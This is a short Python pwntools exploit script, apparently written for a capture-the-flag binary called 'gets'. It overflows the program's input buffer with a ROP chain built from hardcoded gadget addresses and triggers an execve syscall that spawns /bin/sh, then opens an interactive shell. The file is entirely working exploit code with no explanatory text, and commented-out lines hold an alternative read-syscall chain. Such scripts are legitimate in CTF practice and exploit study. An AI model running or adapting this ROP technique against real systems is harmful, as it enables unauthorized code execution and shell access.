#!/usr/bin/env python

from pwn import *

pico = 0

if pico:
	r = process("./gets")
else:
	r = process("./cygs")
	gdb.attach(r, '''
		b *0x0804889e
		c
		''')


r.recvuntil("!")

PUSH_EAX = 0x080b8166
POP_EAX = 0x080b81c6
POP_EBX = 0x080481c9
POP_ECX = 0x080de955
POP_EDX = 0x0806f02a
# PUSH_EBX = 0x08089f5a
# PUSH_ECX = 0x080e2015
# PUSH_EDX = 0x08063e38
SYSCALL = 0x0806cc25
BSS_START = 0x080eaf80
SYS_READ = 3
SYS_EXECVE = 11

PUSH_EAX_POP_EBX = 0x080d624f

# read: (ebx: 0, ecx: bss, edx: 8)
# execve (bss, 0, 0)


payload = ''
payload += '/bin/sh\x00'.ljust(28)
payload += p32(PUSH_EAX_POP_EBX)
payload += p32(POP_EAX)
payload += p32(11)
payload += p32(POP_ECX)
payload += p32(0)
payload += p32(POP_EDX)
payload += p32(0)
payload += p32(SYSCALL)

# payload += p32(POP_EAX)
# payload += p32(0x3)
# payload += p32(POP_EBX)
# payload += p32(0x0)
# payload += p32(POP_ECX)
# payload += p32(BSS_START)
# payload += p32(POP_EDX)
# payload += p32(0x8)
# payload += p32(SYSCALL)



r.sendline(payload)

# r.sendline("/bin/sh\x00")

r.interactive()